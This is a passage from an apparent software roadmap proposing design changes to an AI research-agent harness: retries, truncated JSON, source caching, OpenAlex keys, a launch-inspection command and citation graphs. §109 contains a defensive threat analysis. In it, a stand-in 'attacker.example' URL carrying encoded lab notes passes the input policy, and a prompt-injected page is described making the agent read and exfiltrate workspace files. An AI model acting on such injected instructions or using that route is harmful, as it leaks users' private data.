# Roadmap v3 — proposed sections from the researcher feedback round (§101–§116)

**Purpose of this document:** proposed sections for `ROADMAP_v3.md`, written from the feedback a
researcher gave in a chat thread on 2026-11-18 and 2026-11-19 after running the harness against one
OpenAI-compatible provider, plus the replies in the same thread. The researcher, the provider and its
models are not named, and the researcher's words are paraphrased rather than quoted: the thread was a
private conversation and this repository is public. Keep it that way in any edit. Except §101,
§102, §103, §105 and §108, which were accepted and built (batches 277, 284, 281, 280, and
282 and 283) and now live in `ROADMAP_v3.md`, §110's AD1 and AD2 (batch 285), §107's OA1 and
OA3 (batch 288), and §104's OC1 (batch 289), nothing here is built
and **no decision below is locked**: every Design Decisions table is a proposal for the
owner to accept, change or refuse, in the convention the three roadmaps already use. A section the owner
accepts keeps its number; one refused is recorded as refused rather than renumbered, so `§N` keeps one
meaning.

**Numbering continues at §101**, after §100 (background subagents, batch 271). Decision-id prefixes
were checked against `ROADMAP.md`, `ROADMAP_v2.md`, `ROADMAP_v3.md`, `README.md` and `AGENTS.md` and are
unused: LF, MW, SV, OC, XR, SO, OA, PW, LC, AD, DG, LN, WT, FP, ME, QA.

**What everything below was checked against.** `main` at `ee15a52` (0.3.21, 2026-11-18), which is
what was public when the researcher installed. The folder on the owner's machine is checked out at
`9ed05a1` (`session-panel-ollama-404`, 0.3.15), six releases behind; §98 resume, §99 visible retries
and §100 background subagents are on `main` and not in that folder. Where the owner's own replies in the
thread describe the code, they were checked too, and the ones the code does not bear out are listed
in **Corrections to the thread** at the end, because several of them were told to the researcher.

**How "measured" is used.** As the other roadmaps use it: a number in this document came from running
the pinned code (textual 8.2.8, openai 3.45.0, the repo's own functions), not from reading. The
scripts are listed in **Appendix A**. Where a claim rests on reading the code alone, it says so.

**Conventions are unchanged:** decisions are locked only by the owner, a built section's record is
append-only, and a deviation is an owner decision in `DEVLOG.md`.

---

## Index

**Fix first — four defects the researcher hit, each verified in the code**

- **§101. Flags a full-screen launch dropped: `--effort` and `--thread` under `--tui`** - **(BUILT in batch 277: now `ROADMAP_v3.md` §101, LF1-LF4)** (`run_tui()` receives the provider, the model and nothing else, so `--tui --effort low` runs at the remembered or shipped `high` and the sidebar says `high`; the same is true of `--thread`, which `relaunch_argv` itself writes after a `/config` restart and the relaunched TUI then ignores. The project refuses `--tui` with a query because "silently dropped" is not honest; these two are the same defect, unrefused)
- **§102. A model call that never answers is reported before half an hour has passed** - **(BUILT in batch 284: now `ROADMAP_v3.md` §102, MW1-MW4)** (the OpenAI-compatible and Anthropic clients keep the SDK's own two retries under the harness's two, at the SDK's 600 s read timeout. Measured: one harness attempt is three requests, so a stalled endpoint costs up to nine requests and about ninety minutes, the first WARNING arrives after about thirty, and every abandoned request is a 499 in the provider's log -- the 499 the researcher saw in the provider's log and never in the harness)
- **§103. A reader who scrolls up stays where they scrolled, and the transcript can be selected** - **(BUILT in batch 281: now `ROADMAP_v3.md` §103, SV1-SV4)** (measured: a reader scrolled to row 5 of 40 is at the bottom again after five streamed rows, because `RichLog.auto_scroll` follows every write. Text selection is not a ceiling of the pinned textual: 8.2.8 calls `get_selection` on a `RichLog` subclass, and a twelve-line prototype returned the dragged text. `/help` still says "not supported by this Textual version", written when the pin was 1.0.0)
- **§104. A JSON pass cut off by the output ceiling is split, not corrected** - **(OC1 BUILT in batch 289, with the owner's OC4-OC7: now `ROADMAP_v3.md` §104; OC2 and OC3 still proposed here, after §106)** (a reply that ended on `finish_reason: length` is marked `complete` when it has text, so a Pass 3a answer cut at the 16,000-token ceiling -- which bounds thinking and text together on some providers -- is sent the "did not parse" corrective and asked for the same answer again, at the same size, three times. The researcher's failure was an unterminated string at character 36,142 of a one-call answer for 63 claims)
- **§105. A claim that ran out of rounds keeps the tier it earned** - **(BUILT in batch 280: now `ROADMAP_v3.md` §105, XR1-XR4)** (D2's fallback overwrites the tier with UNVERIFIED whatever 6b scored, so a partly grounded claim scoring 0.45 (LOW) is published with the label of a claim nothing supports, and its `score_breakdown` -- which B10 says lets a reader recompute the tier -- still says 0.45. The researcher's run went from 37 LOW to 37 UNVERIFIED this way, and they read it correctly as the retries running out; the thread told them otherwise)

**Cost — where the 4.6 M input tokens went**

- **§106. A source is read once per run, and checked against all of itself** - **(NOT BUILT: proposed 2026-11-20)** (the corpus keeps 20,000 characters of a document `fetch_url` now holds 200,000 of, so a verbatim quote from character 40,000 of a paper the run read is recorded `quote_verified: false` -- "the fabricated-citation signal" -- and embedding windows cover the first ~5,700 characters, measured. Every pass re-downloads and re-pages the same paper because offset 0 never reads the cache and passes outlive its 300 s; paging an 80,000-character paper one 5,000-character page per step re-sends about 760,000 characters of input in one pass)
- **§107. OpenAlex with a key, a pace and a backoff** - **(OA1 and OA3 BUILT in batch 288, with the owner's OA4 and OA5: now `ROADMAP_v3.md` §107; OA2 still proposed here)** (OpenAlex has required an API key since 2026-02-13 and bills keyless use at a tenth or less of a free key's $1/day; `scholar.py` sends a `mailto` and no key, retries immediately, ignores `Retry-After` and treats a `daily_budget` 429 as worth two more tries. No network tool in the harness paces requests per host, which matters now that §100's background subagents can fetch concurrently)

**Visibility — a run whose inside cannot be seen**

- **§108. A research pass you can watch** - **(BUILT in batches 282 and 283: now `ROADMAP_v3.md` §108, with the owner's PW6 and PW7)** (`_translate` counted no thinking into `pass_activity`, a pass's view read the archive, which holds finished steps only, finished passes and subagents left the panel, and no figure said what a run or a pass had spent)
- **§109. A launch you can read before it runs** - **(NOT BUILT: proposed 2026-11-20)** (the researcher had another model build a launcher so they could see exactly what a launch does: the command, what each setting does, permissions now against as shipped, and a safety check. The harness has the facts and no view of them. Also covers the defaults question the thread raised -- measured, turning `read` on by default opens a path the input policy does not close -- and keys at rest)

**Research quality — what the researcher actually came for**

- **§110. The draft you can read, with its checks on it** - **(AD1 and AD2 BUILT in batch 285: now `ROADMAP_v3.md` §110; AD3 still proposed here, gated on §115)** (the researcher reads the raw draft and finds the report hard to use, because in a synthesis the subtle problems compound. Final synthesis is handed the atomised claims and never the draft's order, so it rebuilds a structure the draft already had. Proposes the Pass 1 draft as a first-class artifact with each claim's tier and flags marked where it was said, in pure code)
- **§111. Claims that know what they rest on** - **(NOT BUILT: proposed 2026-11-20)** (the researcher asked whether claims are stored as a dependency graph, so that a claim's confidence could be computed from what it depends on. They are a flat list; the thread's "local and global claims" exist in a DEVLOG ruling, not in the code. Proposes `depends_on` edges at Pass 2 and a premise floor computed in code, shown before it is ever scored)
- **§112. Looking where the paper would not have looked: citations, both ways, and out of network** - **(NOT BUILT: proposed 2026-11-20)** (an external assessment the researcher passed on found the prior-art survey possibly circular, the seed paper's own reference list re-sorted; the researcher found the run followed citations toward the high-level work and missed the cross-disciplinary work. Proposes a citation graph built by the harness from OpenAlex, and searches written in mechanism vocabulary rather than the seed paper's, to find parallel lines of work that do not cite each other)
- **§113. Asking for the paper instead of plowing on** - **(WT1, WT3 and WT5 BUILT in batch 286, WT3 and WT5 as the owner reshaped them, with the owner's WT6 (`--unattended`); WT2 (`--scout`) BUILT in batch 287, resumed rather than rerun: now `ROADMAP_v3.md` §113; WT4 still proposed here)** (the researcher would rather a run say which paper it could not get, so they can fetch it, and would prefer a light first run that lists what is needed before a full rerun. Proposes a wanted-sources record, a scouting run, a user-supplied sources folder the harness reads into the corpus, and Zotero through MCP)
- **§114. A pass that argues against the answer** - **(NOT BUILT: proposed 2026-11-20)** (the researcher suggested an adversarial pass: a postulate, the observations that would make it false, and predictions against it. Nothing in the pipeline asks what observation would make a claim false and whether anyone has looked. Proposes a falsification pass that routes, as §90 routes disagreement, and never deducts)

**Measurement — before any of the above changes a number**

- **§115. Measuring whether a pass, a weight or a prompt earns its place** - **(NOT BUILT: proposed 2026-11-20)** (the researcher named the confidence formula's hand-chosen constants as the garden-of-forking-paths problem, and expected runs to vary with small changes of settings. Proposes a matched-budget ablation, a run-to-run variance figure, a sensitivity sweep of the confidence constants, and a small expert-graded case set the researcher offered to help write)
- **§116. How to ask it a question** - **(NOT BUILT: proposed 2026-11-20)** (the gap the researcher put first: no guidance on what questions the harness is good at, which models suit it, or what effort to choose. Documentation and two prompt sentences, the prompt half gated on §115)

**Dependencies, read once.** §101–§105 are independent and small. §106 makes §112's graph cheap and
§105's reasons honest. §107 is a prerequisite of §112. §115 gates every change that alters a number or
a prompt: §111's propagation, §114, and §116's prompt half. §110 and §113 are additive artifacts and
need no gate. See **Sequencing** at the end.

---

## §101. Flags a full-screen launch dropped: `--effort` and `--thread` under `--tui`

**Accepted and built in batch 277 (2026-11-21), and recorded as `ROADMAP_v3.md` §101 (LF1-LF4).**
The owner chose the flag over `tui.effort` (LF1) and carrying `--ref`, which the census found
dropped as well, over refusing it (LF4). The record holds the decisions and their ids; this
proposal's text is in the history of the commit that added this document.

---

## §102. A model call that never answers is reported before half an hour has passed

**Accepted and built in batch 284 (2026-11-23), and recorded as `ROADMAP_v3.md` §102
(MW1-MW4).** The owner chose no SDK retry on every client rather than on the model call alone
(MW1), and a fixed 30 s for the lookups beside the key's 600 (MW2). They also chose the waiting
line in both shells, in §108's words (MW3). MW4 is new: no retry after a stop, which the
measurement found when a stop pressed during a silent call still sent every attempt. The
measurement also found that the lookups in front of the call doubled the proposal's nine requests
to fifteen, and that google-genai had no timeout at all. The record holds the decisions and their
ids; this proposal's text is in the history of the commit that added this document.

---

## §103. A reader who scrolls up stays where they scrolled, and the transcript can be selected

**Accepted and built in batch 281 (2026-11-22), and recorded as `ROADMAP_v3.md` §103
(SV1-SV4).** The owner chose that a transcript follows again at the bottom or on any submit, and that
its border counts the new lines below a scrolled-up reader (SV1); that a selection copies the rows as
drawn (SV2); and that both apply to all four transcript panes (SV4, added at the owner's question).
The record holds the decisions and their ids; this proposal's text is in the history of the commit
that added this document.

---

## §104. A JSON pass cut off by the output ceiling is split, not corrected

**OC1 accepted and built in batch 289 (2026-11-26), and recorded as `ROADMAP_v3.md` §104, with four decisions of the owner's this proposal did not have: the cut is read before §95's reasoning-only ask (OC4), an Anthropic tool call the ceiling cut is refused rather than run (OC5), the stored turn records the cut and a resume asks once for the whole answer (OC6), and both shells' stopped-early line names the ceiling (OC7).** The owner chose one field mapped from the four providers' spellings, a cut JSON answer used only if it still parses and otherwise failed at once naming the ceiling, in the loop the passes share with §20's reviewer, and a cut prose pass traced and used, the locked rule. The proposal's premise needed one correction: `_check_not_truncated` lets a truncated pass with text continue, so a `max_tokens` stop alone would still have reached the parse corrective. Measured before the change, a cut Pass 2 was three requests and a parse failure. **OC2 and OC3, batching, are still proposals here**; the text below is the proposal as written, and the record holds the decisions as built.

**Proposed 2026-11-20, from the researcher's run.** Pass 3a: "Response did not return valid JSON:
Unterminated string starting at: line 755 column 16 (char 36142)", retried with the corrective message,
which the researcher noted took a long time. One call was grounding all 63 factual claims.

**Read, not driven.** `core/client.py` keeps `finish_reason` for one purpose: to say a tool call's
arguments "were cut off by the response token limit". A TEXT reply that ended on `length` reaches
`core/loop.py:2214` and is given `stop_reason = "complete"`. `_check_not_truncated` therefore never
sees it, and `retry_until_json` sends the "did not parse" corrective into the same thread, which asks
for the same JSON again. `max_tokens: 16000` "bounds thinking and response text together" on current
Anthropic models (the config's own comment), and a model that thinks at `high` before writing a
10,000-token array is then cut at the same place on every attempt. §98's own measurement is the size
in question: a Pass 3a answer of 59,009 characters.

**What this does not establish.** That this run was cut by the ceiling rather than by a malformed
quote. An unterminated string near the end of a very long answer is the shape a cut produces, and the
pass's log line `finish_reason=...` would confirm it.

**Proposal.**

- `ModelResponse` carries `finish_reason`, and a text reply that ended on `length` gets
  `stop_reason = "max_tokens"`. `_check_not_truncated` already handles a non-`complete` stop: a cut
  JSON pass then fails with the reason, not three corrective rounds.
- **The answer to a cut is a smaller question.** 3a, 3b, 6a and 6b take their claims in batches
  (`research.claims_per_call`, default 20), grouped so a deduplicated entity's claims stay in one batch
  -- the reason Pass 2 asks for consistent entity names. A batch that is still cut is split in half once.
- The corrective message is kept for what it is for: a reply that finished and is not JSON.

**Drawbacks.** More calls per pass, and each batch thread would re-read the sources it needs -- which is
why this wants §106 first, or batching multiplies the paging cost. Batches lose cross-claim context the
critic uses for contradictions (3b checks a claim "against the others"); 3b should keep the whole claim
list as read-only context while answering for its batch only. §98's resume points become per batch, a
storage change.

**Alignment.** RS7's lesson that a 4-hour run should not die on its output's shape; §66's rule that a
pass is asked about exactly the claims it answers for.

### Design Decisions Record — §104 (proposed)

| id | decision |
|---|---|
| **OC1** | **A text reply that ended on the output ceiling is `max_tokens`, not `complete`**, and a JSON pass is never sent the parse corrective for a reply it was not allowed to finish |
| **OC2** | **The JSON passes take claims in entity-grouped batches**, default 20, with one halving on a cut |
| **OC3** | **3b answers for its batch with the whole claim list as context**, so contradiction-checking does not shrink to the batch |

---

## §105. A claim that ran out of rounds keeps the tier it earned

**Accepted and built in batch 280 (2026-11-21), and recorded as `ROADMAP_v3.md` §105
(XR1-XR4).** The owner chose the largest deduction alone as a flagged claim's reason (XR2), and
the section in every shell's report (XR4). XR3 is amended: Pass 6b scores the revised text, so
the revision is published, under the tier that belongs to it, with what the claim was first
stated as beside it. The record holds the decisions and their ids; this proposal's text is in
the history of the commit that added this document.

---

## §106. A source is read once per run, and checked against all of itself

**Proposed 2026-11-20, from three of the researcher's observations.** The run seemed to spend about
30 minutes just reading the paper; Pass 6b re-fetched the same preprint PDF at offsets 5000 through
75000 after Pass 1 had read it; and the provider's dashboard showed 4.6 M input against 502.8 K output
over 226 requests. The researcher worried the request volume would get their address blocked.

**Measured (B1), what the run keeps of a source.**

| | figure | where |
|---|---|---|
| characters `fetch_url` holds per document | 200,000 | `HELD_CHARS`; whole PDFs readable since §92 |
| characters the corpus keeps per document | **20,000** | `MAX_DOCUMENT_CHARS` |
| characters the embedding windows cover | **~5,700** of an 80,000-character text | 24 windows (`MAX_WINDOWS`) of 480 with one sentence of overlap |
| `quote_verified` for a verbatim quote at character 40,000 or 70,000 of a paper the run paged through | **`false`** | `_verify_quote`, strict containment against the corpus |

`MAX_WINDOWS = 24` is commented "more than fetch_url's 5000 chars can produce", and `MAX_DOCUMENT_CHARS`
"bounds this module against a future tool that returns more ... a cap that bites in normal operation
would silently shorten the text a similarity score is computed from". §51 paging and §92's PDFs are
that future tool, and the cap now bites in normal operation. `quote_verified: false` is documented as
"the fabricated-citation signal"; for anything past 20,000 characters it now fires on genuine quotes,
so the signal means nothing exactly where a paper's results live. The embedding score is protected by
the quote being its own first window (`source_passages`), so this costs the *check*, not mostly the
score.

**Read, not driven, why every pass reads it again.** Each pass is its own thread by design. `fetch_url`
at offset 0 "never reads the cache" (a fresh read is a fresh read), and the cache lives 300 s, while a
pass on a 20 tok/s endpoint takes far longer than that. So Pass 1, 3a and every 6b round download the
document again and page it again.

**Arithmetic, what paging costs.** A pass whose prompt is P characters reads an 80,000-character paper
one 5,000-character page per step: 16 steps, each re-sending everything before it.
Input = 16P + 5,000 × (0 + 1 + … + 15) = **16P + 600,000 characters**. The same 16 pages requested in
one reply (the loop already runs a reply's tool calls) cost **2P + 80,000**. At P = 10,000 that is
760,000 against 100,000 characters, about 190 K against 25 K tokens, per paper, per pass that reads it.
This is the first-order explanation of an input:output ratio of 9:1.

**Proposal.**

- **The corpus keeps what the run read**, up to `HELD_CHARS`, and quote verification runs against the
  whole of it. `quote_verified: false` becomes trustworthy again, and §45 slice A's reason for keeping it
  out of the score can be revisited with evidence.
- **Windows cover the document by retrieval, not by position**: a cheap lexical prefilter picks the
  N windows most like the claim from the whole text, then the embedder ranks those. The window budget
  stays fixed; what it is spent on changes.
- **`read_source(url, offset, length)`**, a run-scoped tool serving the corpus with no network: a later
  pass reads what an earlier pass fetched, from the same bytes, at up to 20,000 characters a page. It
  can only return text this run already fetched through `fetch_url`'s policy, so it adds no egress.
- **The pass prompts say to request every page needed in one reply** when reading a whole document.

**Drawbacks.** Memory: 200 documents × 200,000 characters is 40 MB of text at the worst case, and the
`sources/` artifacts grow with it. Embedding cost rises unless the prefilter holds the window count
fixed, which is why it is part of the proposal. A served corpus is the text as fetched, not as it is now
-- that is the point for reproducibility, and a pass that needs the live page still has `fetch_url`.
Larger pages in one reply make one step's input larger; the compaction backstop is unchanged and
still applies. The prompt sentence changes model behaviour and belongs behind §115.

**Alignment.** §45: the corpus exists to say "what a claim was actually grounded IN". §51's paging
contract, extended across passes rather than replaced. Passes still do not share history: they share a
corpus the harness owns, which is what §45 already does for scoring.

### Design Decisions Record — §106 (proposed)

| id | decision |
|---|---|
| **SO1** | **The corpus keeps a document up to `HELD_CHARS`, and quotes are verified against all of it** |
| **SO2** | **Similarity windows are chosen by a lexical prefilter over the whole document**, at an unchanged window budget |
| **SO3** | **`read_source` serves this run's corpus to later passes with no network**, and can return nothing this run did not fetch |
| **SO4** | **Pass prompts ask for a whole document's pages in one reply** (gated on §115) |

---

## §107. OpenAlex with a key, a pace and a backoff

**OA1 and OA3 accepted and built in batch 288 (2026-11-26), and recorded as `ROADMAP_v3.md` §107, with two decisions of the owner's this proposal did not have: a 404 is no record and a 401 or 403 ends the lookups (OA4), and the trace's cause line quotes no query string (OA5).** The owner chose the key as a header, sent only to `api.openalex.org`, and a new `scholar_retry_base_delay_s` at one second, with a rate-limit 429 counting as an attempt. Measuring the retry found a defect the proposal did not have: one cited DOI OpenAlex does not index turned the lookup off for the run. **OA2, the per-host pace, is still a proposal here**; the text below is the proposal as written, and the record holds the decisions as built.

**Proposed 2026-11-20, from the thread.** The researcher turned on `scholar_lookup` and asked whether
the harness backs off, since some services block a client for a day without exponential backoff.
The thread answered that the API script "already supports client-side rate limiting" and that it has no
exponential backoff. Both were checked.

**Read, and checked against OpenAlex's documentation.**

- OpenAlex has required an API key since 2026-02-13. A free key gets a $1/day budget; a list call costs
  $0.0001, a search $0.001, a singleton nothing; keyless use is a tenth of a free key's budget or less
  (OpenAlex's own pages say $0.10 and $0.01 in different places). The per-second ceiling is 10 keyless and
  30 with a free key. A `daily_budget` 429 cannot be retried until midnight UTC; a per-second 429
  carries `Retry-After`.
- `scholar.py` sends `mailto` when `scholar_mailto` is set and **no key** -- there is no key setting.
  `citation_percentile` makes two counting queries per work. Keyless, a run can exhaust the day's
  budget on a few dozen papers, after which every lookup fails and the lookup disables itself for the
  run.
- `ScholarLookup._get` retries `scholar_max_retries` times **immediately**: no backoff, no
  `Retry-After`, and a `daily_budget` 429 is tried twice more.
- **No network tool paces requests per host.** The only throttles are §53's byte meters (off by
  default). The thread's "already supports client-side rate limiting" is not in 0.3.21. Model calls do
  back off exponentially with jitter (`provider_errors.backoff_delay`); the thread's "no" was about the
  wrong layer.
- The model also reaches `api.openalex.org` itself through `fetch_url` (the researcher's run did:
  `filter=cites:...&sort=cited_by_count:desc`), keyless, on the same IP budget.

**Proposal.**

- **`OPENALEX_API_KEY`, harness-held** through `env_secrets`, sent by `scholar.py` and by §112's
  citation tool, **never** written into a URL the model chose: a key the model can see is a key a page
  can ask it to send elsewhere.
- **A per-host pace** in `_net_common`, shared across a run's passes and §100's background subagents:
  OpenAlex at its documented per-second limit, a conservative default for any host.
- **`Retry-After` honoured, exponential backoff otherwise**, and a `daily_budget` 429 ends lookups for
  the run with one trace line naming the reset time.
- The thread's two statements corrected for the researcher.

**Drawbacks.** One more secret to hold, and the existing input policy refuses credential-shaped
arguments, which is a reason the key must not travel through a tool parameter. Pacing slows a run that
fetches many pages from one host -- deliberately. A key does not help the model's own `fetch_url` calls
to OpenAlex; §112 replaces those with a tool that does use it.

**Alignment.** "Only ever what the user configured" (the `mailto` comment) applies to the key too;
§53's meters are the precedent for a shared, per-run network ledger.

### Design Decisions Record — §107 (proposed)

| id | decision |
|---|---|
| **OA1** | **An OpenAlex key held by the harness and never placed in a model-chosen URL** |
| **OA2** | **Requests are paced per host across the whole run**, subagents included |
| **OA3** | **`Retry-After` and exponential backoff for scholarly lookups, and a daily-budget refusal ends lookups for the run** |

---

## §108. A research pass you can watch

**Accepted and built in batches 282 (PW1-PW4) and 283 (PW5), 2026-11-22, and recorded as
`ROADMAP_v3.md` §108.**
The owner chose that every run the viewer opens streams its step in progress, not research
passes only (PW2); that a running pass row carries every figure (PW3); and that each research
row opens its pass while the agent panel keeps finished subagents (PW4). They added a spinner on
every running row of the sidebar, at four frames a second once its cost was measured (PW6), and a
CLI line for a pass waiting on the model (PW7). For PW5 they chose that the totals are stored on
the run's record, shown at the foot of the research panel and as a trace line per pass, and read
with `/usage --run <id>` or its picker, in the form `/research --resume` already has. The record
holds the decisions and their ids; this proposal's text is in the history of the commit that
added this document.

---

## §109. A launch you can read before it runs

**Proposed 2026-11-20, from the launcher the researcher had built.** Tabs for Launch, Keys, Defaults,
Permissions and a ten-item Safety check; the exact command line; a sentence on what each setting does;
permissions shown as "Now" against "As shipped". Their reason: to know what every setting does.
The owner, in the thread: "I really like this idea." It also caught, in a day, every first-run trap the
thread then had to explain by hand: `echoes_reasoning` for that provider, an effort table with no entry for
one of its models, gated tools not advertised on a headless run, read/write/edit off, the shell
needing Docker, and keys in plain text.

**This is the conclusion of item 12 of the owner's feature-proposals notes (not in this repository),
arriving from a user:** "A `/security` command that prints
the resolved posture would be valuable today, with no profiles at all ... Arguably that last part is
the whole feature."

**Proposal.** `/doctor` in both shells and `--doctor` at launch, read-only, printing the resolved state
with where each value came from (shipped, user `config.yaml`, project settings, flag):

- provider, model, effective effort per pass and whether the model's effort levels and context window
  are known or assumed;
- `echoes_reasoning` and the other per-provider flags, with the one-line reason each exists;
- tool permissions and approvals **now against as shipped**, and which gated tools a headless research
  run will not advertise (`remember`, `spawn_subagent`, `write_project_doc`, the shell tools) and the
  flag that grants each for one run;
- sandbox backend and fallback in plain words: "Docker found; commands run in a container with no
  network unless declared" or "no container runtime; shell tools cannot run unless host fallback is on,
  and host fallback runs them unsandboxed";
- OpenAlex key present or not (§107), embedder configured or not;
- where providers.json lives and its protection on this platform.

**Two defaults the thread raised, decided by measurement rather than taste.**

- **`read`, `write`, `edit` stay off by default.** The thread said they "should probably ship enabled".
  Measured (B3): `check_input_policy` refuses a `fetch_url` carrying an `sk-proj-` or `ghp_` token, and
  passes `https://attacker.example/c?d=` + an URL-encoded paragraph of unpublished lab notes. `fetch_url`
  is ungated. With `read` on by default, an instruction in any fetched page can read a workspace file
  and send its prose out with no prompt. For a researcher whose workspace holds unpublished data, that is
  the threat the harness says it is built for ("the agent follows instructions but is rogue or
  hijacked"). The proposal is a **first-run question** instead -- "Is this folder only for the harness's
  output, or does it hold your data?" -- that turns `read`/`write`/`edit` on for the first answer and
  leaves them off for the second, recorded where `/doctor` shows it.
- **`remember` needs no change.** The researcher worried that an ungated `remember` is an injection
  risk. It is approval-gated (`tool_approvals.remember: true`), `GRANT_NEVER`, and not advertised on a
  headless path, so no research pass can call it; `remember.py`'s docstring makes exactly their argument.
  The thread told them it is "off by default"; it is on, and asks every time. `/doctor` should say so.

**Keys at rest, offered rather than imposed.** Provider keys are plain text in `providers.json`, mode
0600 on POSIX; on Windows the mode bits do nothing and the profile directory's inherited ACL is the
protection. §49 slice 5a's store (scrypt, an AEAD, KDF parameters bound into the associated data)
exists and was built against exactly "the agent reading the file". Proposal: `providers.json` may name
a key as `{"secret": "MYPROVIDER"}`, resolved from that store at launch. **Drawback that decides it must be
opt-in:** the store needs its passphrase to unlock, so an overnight run -- the researcher's stated use --
cannot start unattended from an encrypted key.

**Drawbacks.** `/doctor` is one more surface that must stay truthful, so it should be built from the
same resolvers the code uses (the same feature-proposals item: "build provenance properly or don't claim it"),
not from a second reading of the config. The first-run question is one more prompt.

**Alignment.** D24 (declare, do not infer), the strict defaults, `UN4` ("a half-understood control is
worse than none").

### Design Decisions Record — §109 (proposed)

| id | decision |
|---|---|
| **LC1** | **`/doctor` and `--doctor` print the resolved launch, posture and provider facts with each value's origin**, from the resolvers the code uses |
| **LC2** | **`read`/`write`/`edit` stay off by default; a first-run question sets them for a harness-only folder** |
| **LC3** | **`remember` is unchanged**; `/doctor` reports it as on and approval-gated |
| **LC4** | **A provider key may live in the §49 secret store**, opt-in, with the unattended-launch limit stated where it is offered |

---

## §110. The draft you can read, with its checks on it

**AD1 and AD2 accepted and built in batch 285 (2026-11-23), and recorded as `ROADMAP_v3.md` §110.** The owner chose the short mark (the claim's id and tier, with the detail after the draft), the synthesis as the shipped `report_style`, and the annotated draft in every shell under `draft-first`, and kept `01_raw_response.md` exactly as it is. **AD3 is still a proposal here**, gated on §115; the text below is the proposal as written, and the record holds the decisions as built.

**Proposed 2026-11-20, from the researcher's strongest and most repeated point.** They much prefer
the raw Pass 1 response to `report.md`, which drops a great deal of the useful nuance and which they
found close to unreadable. Their reason: in a synthesis where each point builds on others and the
causal structure is not visible, a reader stops attending, while the raw response sets out its
assumptions one at a time, so a reader can accept or reject each and then knows which downstream
conclusions to ignore. In a synthesis the subtle problems compound. The external assessment they passed
on reached the same place: the Pass 1 draft is dense with checkable handles, and the later passes
atomise it into 87 claims and recompose it, so the result should be expected to read worse to this
reader.

**Read.** `_synthesis_input` hands final synthesis the query, the claims as JSON and the coverage gaps.
It never sees the draft. `final_synthesis.md` asks it to write a "coherent, human-facing report" that
does not mention claims. So the report reconstructs an argument's structure from a flat list, which is
where the assessment's strawman of one position in the literature can come from. Each claim
already carries `source_span`, "approximate location or quote from the raw response this claim came
from".

**Proposal.**

- **`01_annotated_draft.md`**, in pure code: the Pass 1 draft (each candidate's, in ensemble mode) with
  every claim's tier, `loop_exhausted` and §105's limiting reason marked where its `source_span` is
  found, and a footnote per claim with its sources and the claim id. Claims whose span cannot be placed
  are listed at the end with a count, so a placement failure is visible rather than silent.
- `report.md` opens with a link to it, and `research.report_style: draft-first` makes the annotated
  draft *the* report for readers who want it, with the synthesis kept as `report_synthesis.md`.
- **Final synthesis sees the draft's outline** -- its headings and the order its claims were made in --
  so the report follows the argument the draft made instead of inventing one.

**Drawbacks.** `source_span` is "approximate", so placement is fuzzy matching and will miss some; the
end-of-file list is the mitigation. An annotated draft is long, and the researcher themself says a
low-attention reader would see length as a negative -- which is why it is a style, not a replacement.
The outline change alters synthesis output and belongs behind §115; the artifact does not.

**Alignment.** The owner's consultation notes (their first point, not in this repository) named the
anchoring concern before any user did;
this does not remove generate-then-verify, it makes what the verifier did visible on the thing it
verified. Zero model calls for the artifact.

### Design Decisions Record — §110 (proposed)

| id | decision |
|---|---|
| **AD1** | **Every run writes an annotated draft in code**, claims marked where they were made, unplaced claims counted |
| **AD2** | **`research.report_style: draft-first`** makes it the report; the synthesis stays beside it |
| **AD3** | **Final synthesis is given the draft's outline** (gated on §115) |

---

## §111. Claims that know what they rest on

**Proposed 2026-11-20, from the researcher.** They asked whether claims are stored as a dependency
graph: if they were, a claim's confidence could be computed from what it depends on, and the graph's
consistency could be tested mechanically. The thread answered that the harness has "local claims" and
"global claims" as the closest thing. The code has neither: the phrase is in the owner's ruling quoted in
DEVLOG (batch 149's re-tiering scope), and `Claim` is flat -- `id`, `text`, `type`, `entities`,
`source_span`, then the fields each pass fills.

**Why it is worth more than it looks.** It is the machine form of the reading the researcher described
in §110: knowing which downstream conclusions to ignore once a premise is wrong. A
`synthesis` or `speculative` claim's real warrant is the factual claims it combines, and today a
synthesis claim is capped at 0.65 and never grounded, whatever its premises scored.

**Proposal.**

- Pass 2 adds `depends_on: [claim ids]` to each claim: the claims it uses as premises. Validated at the
  payload boundary like every other field (§30, §66): ids must exist, no self-edge.
- **In code, after Pass 5:** cycles are reported, not resolved; each claim gets `premise_floor`, the
  lowest tier among its premises; a claim whose tier is above its premise floor is flagged
  `rests_on_weaker` with the premise named. **Display only at first** -- the annotated draft (§110) and
  `/claims` show it -- and nothing is subtracted.
- Only after §115 shows the edges are reliable: whether `premise_floor` routes a claim to 6a (the §90
  shape: route, never deduct), or caps its tier.

**Drawbacks.** The edges are model-extracted and will be noisy; display-only is the hedge. A propagation
rule is a new arbitrary choice -- exactly the "garden of forking paths" the researcher warned of -- so it
is not chosen here. `Claim` gains a field, and `base.py`'s serialization note applies: every `vars(c)`
site, the payload spec, storage, resume points (§98) and `claims_view` move together. Ensemble mode's
union of claims makes edges cross candidates; an edge between claims from different candidates should be
allowed and marked.

**Alignment.** B10 (the breakdown lets a reader recompute), §90 (route, do not deduct), and the
consultation notes' third point ("what a reviewer wants is the conditions under which a result holds").

### Design Decisions Record — §111 (proposed)

| id | decision |
|---|---|
| **DG1** | **Pass 2 records `depends_on`**, validated at the payload boundary |
| **DG2** | **`premise_floor` and `rests_on_weaker` are computed in code and displayed only** |
| **DG3** | **Whether a premise floor routes or caps is decided after §115 measures the edges** |

---

## §112. Looking where the paper would not have looked: citations, both ways, and out of network

**Proposed 2026-11-20, from the researcher's longest technical exchange.** The assessment they
passed on found the prior-art survey possibly circular -- most of its literatures looked like the seed
paper's own reference list re-sorted -- named neighbouring fields the paper's authors would not have
cited, and found one section reinventing an established modelling framework without citing it. The
researcher's own reading: the run followed the citation tree toward the high-level work and missed the
cross-disciplinary work, and finding lines of research that already solved a problem is something
researchers want and find hard, because parallel lines often do not cite each other. On method, they
suggested generating the citation network: who cites a paper, and for what, weighs it; a network shaped
like a ring tends to mark a field-staking review, which is a good way in; and every publication gives
both who it cites and who cites it. When `scholar_lookup` was on, the
model started building that network itself, through `fetch_url` to `api.openalex.org`.

**Read.** `scholar.py` uses OpenAlex for authority scoring only. No tool returns a work's references or
citers, and no stage of the pipeline reads a graph.

**Proposal.**

- **A `citations` tool** over OpenAlex (`referenced_works`, `filter=cites:`), batched up to OpenAlex's
  50 values per filter, keyed and paced by §107, returning compact rows (id, title, year, venue,
  cited-by count, and the sentence-level context where a source provides it). Edges go into the run as
  harness-held data, not model claims: an edge is a fact the API returned.
- **A lineage stage after Pass 0**: from the seed works the plan names, one hop back and one forward,
